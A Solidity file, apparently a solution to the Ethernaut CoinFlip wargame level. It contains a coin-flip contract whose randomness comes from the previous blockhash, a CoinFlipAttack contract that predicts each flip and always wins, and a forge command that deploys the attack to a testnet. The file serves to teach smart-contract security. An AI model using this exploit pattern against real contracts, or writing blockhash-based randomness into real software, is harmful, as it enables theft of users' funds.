// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract CoinFlipAttack {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public coinFlip;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function getFlipValue() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        return (blockValue / FACTOR) == 1;
    }

    function flipAttack() public returns (uint256) {
        bool side = getFlipValue();
        coinFlip.flip(side);
        return coinFlip.consecutiveWins();
    }
}

/**
Deploy a contract with forge create:

forge create --broadcast --rpc-url $OP_SEP_RPC --private-key $WALLET_PK ./src/CoinFlip.sol:CoinFlipAttack --constructor-args $INSTANCE
*/
